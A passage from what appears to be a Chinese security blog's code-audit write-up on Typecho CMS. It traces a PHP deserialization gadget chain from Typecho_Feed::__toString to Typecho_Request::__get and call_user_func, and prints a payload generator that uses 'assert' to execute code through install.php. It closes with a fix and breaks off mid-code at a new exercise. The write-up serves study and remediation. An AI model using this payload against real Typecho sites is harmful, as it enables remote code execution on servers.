language_">$this</span>-&gt;_adapter-&gt;<span class="title function_ invoke__">parseSelect</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">INSERT</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>] .</span><br><span class="line">                  <span class="string">&#x27; (&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span> .</span><br><span class="line">                  <span class="string">&#x27; VALUES &#x27;</span> .</span><br><span class="line">                  <span class="string">&#x27;(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="title function_ invoke__">array_values</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">DELETE</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>] .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">UPDATE</span>:</span><br><span class="line">              <span class="variable">$columns</span> = <span class="keyword">array</span>();</span><br><span class="line">              <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                  <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                      <span class="variable">$columns</span>[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>] .</span><br><span class="line">                  <span class="string">&#x27; SET &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$columns</span>) .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>该方法用于构建SQL语句，并没有执行数据库操作，所以暂无利用价值。</p>
</li>
<li><p>第三处<strong>var\Typecho\Feed.php</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable">$result</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;&#x27;</span> . <span class="variable language_">$this</span>-&gt;charset . <span class="string">&#x27;&quot;?&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS1</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">          ......</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS2</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">          <span class="variable">$result</span> .= <span class="string">&#x27;&lt;rss version=&quot;2.0&quot;</span></span><br><span class="line"><span class="string">              xmlns:content=&quot;http://purl.org/rss/1.0/modules/content/&quot;</span></span><br><span class="line"><span class="string">              xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;</span></span><br><span class="line"><span class="string">              xmlns:slash=&quot;http://purl.org/rss/1.0/modules/slash/&quot;</span></span><br><span class="line"><span class="string">              xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;</span></span><br><span class="line"><span class="string">              xmlns:wfw=&quot;http://wellformedweb.org/CommentAPI/&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;channel&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">          <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="variable">$lastUpdate</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_items <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;item&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;title&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;title&#x27;</span>]) . <span class="string">&#x27;&lt;/title&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;link&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/link&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;guid&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/guid&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;pubDate&gt;&#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dateFormat</span>(<span class="variable">$item</span>[<span class="string">&#x27;date&#x27;</span>]) . <span class="string">&#x27;&lt;/pubDate&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>])) &#123;</span><br><span class="line">                  <span class="keyword">foreach</span> (<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>] <span class="keyword">as</span> <span class="variable">$category</span>) &#123;</span><br><span class="line">                      <span class="variable">$content</span> .= <span class="string">&#x27;&lt;category&gt;&lt;![CDATA[&#x27;</span> . <span class="variable">$category</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;]]&gt;&lt;/category&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          ......</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>在代码 <strong>19行</strong> ， <strong>$this-&gt;_items</strong> 为类变量，反序列化可控，在代码 <strong>27行</strong> ， <strong>$item[‘author’]-&gt;screenName</strong> ，如果 <strong>$item[‘author’]</strong> 中存储的类没有’screenName’属性或该属性为私有属性，此时会触发该类中的 <strong>__get()</strong> 魔法方法，这个可作为进一步利用的点，继续往下看代码，未发现有危险函数的调用。</p>
</li>
</ul>
<p>记一波魔术方法及对应的触发条件，具体如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>

<p>在 <strong>var&#x2F;Typecho&#x2F;Request.php</strong> 的  <strong>Typecho_Request</strong> 类中，我们发现 <strong>__get()</strong> 方法，跟踪该方法的调用，具体如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_filter <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="title function_ invoke__">array_map</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>) : <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$value</span> = !<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">0</span> ? <span class="variable">$value</span> : <span class="variable">$default</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_applyFilter</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> <strong>array_map()</strong> 函数和 <strong>call_user_func</strong> 函数，都可以作为利用点，**$filter** 作为调用函数，**$value** 为函数参数，跟踪变量,看一下是否可控。这两个变量都来源于类变量，反序列化可控。从上面的分析中，可知当 <strong>$item[‘author’]</strong> 满足一定条件会触发 <strong>__get</strong> 方法。</p>
<p>假设 <strong>$item[‘author’]</strong> 中存储 <strong>Typecho_Request</strong> 类实例，此时调用 <strong>$item[‘author’]-&gt;screenName</strong> ，在<strong>Typecho_Request</strong> 类中没有该属性，就会调用类中的 <strong>__get($key)</strong> 方法，**$key** 传入的值为 <strong>scrrenName</strong> 。参数传递过程如下：<code>$key=&#39;scrrenName&#39;</code>&#x3D;&gt;<code>$this-&gt;_param[$key]</code>&#x3D;&gt;<code>$value</code></p>
<p>我们将 <strong>$this-&gt;_param[‘scrrenName’]</strong> 的值设置为想要执行的函数，构造 <strong>$this-&gt;_filter</strong> 为对应函数的参数值，具体构造如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们去看一下 <strong>Typecho_Feed</strong> 类的构造，该类在 <strong>var&#x2F;Typecho&#x2F;Feed.php</strong> 文件中，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;&#x27;</span> . <span class="variable language_">$this</span>-&gt;_charset . <span class="string">&#x27;&quot;?&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS1</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS2</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="string">&#x27;&lt;rss version=&quot;2.0&quot;</span></span><br><span class="line"><span class="string">            xmlns:content=&quot;http://purl.org/rss/1.0/modules/content/&quot;</span></span><br><span class="line"><span class="string">            xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;</span></span><br><span class="line"><span class="string">            xmlns:slash=&quot;http://purl.org/rss/1.0/modules/slash/&quot;</span></span><br><span class="line"><span class="string">            xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;</span></span><br><span class="line"><span class="string">            xmlns:wfw=&quot;http://wellformedweb.org/CommentAPI/&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;channel&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$lastUpdate</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_items <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;item&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;title&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;title&#x27;</span>]) . <span class="string">&#x27;&lt;/title&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;link&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/link&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;guid&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/guid&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;pubDate&gt;&#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dateFormat</span>(<span class="variable">$item</span>[<span class="string">&#x27;date&#x27;</span>]) . <span class="string">&#x27;&lt;/pubDate&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>] <span class="keyword">as</span> <span class="variable">$category</span>) &#123;</span><br><span class="line">                    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;category&gt;&lt;![CDATA[&#x27;</span> . <span class="variable">$category</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;]]&gt;&lt;/category&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上图代码 <strong>第7行</strong> ，满足 <strong>self::RSS2</strong> 与 <strong>$this-&gt;_type</strong> 相等进入该分支，所以 <strong>$this-&gt;_type</strong> 需要构造，<strong>item[‘author’]</strong> 为触发点，需要构造 <strong>$this_items</strong> ，具体构造如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_type = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">        <span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">Typecho_Request</span>();</span><br><span class="line">        <span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>] = <span class="title function_ invoke__">Array</span>(<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>());</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="variable">$x</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>代码 <strong>22行</strong> 在实际利用没必要添加，install.php在代码 <strong>54行</strong> 调用 <strong>ob_start()</strong> 函数，该函数对输出内容进行缓冲,反序列化漏洞利用结束后，在<strong>var\Typecho\Db.php</strong>代码121行，触发异常，在 <strong>var\Typecho\Common.php</strong> 代码237行调用 <strong>ob_end_clean()函数</strong> 清除了缓冲区内容，导致无法看见执行结果，考虑在进入到异常处理前提前报错结束程序。由此构造该数据。执行结果如下： </p>
<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-20.png"></p>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>造成该漏洞的原因主要有两点：</p>
<ul>
<li>当 <strong>config.inc.php</strong> 文件存在的时，可绕过判断继续往下执行代码。</li>
<li>传入反序列化函数的参数可控</li>
</ul>
<p>修复方法：在 <strong>install.php</strong> 文件第一行判断 <strong>config.inc.php</strong> 是否存在，如果存在，则退出代码执行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/config.inc.php&#x27;</span>))</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 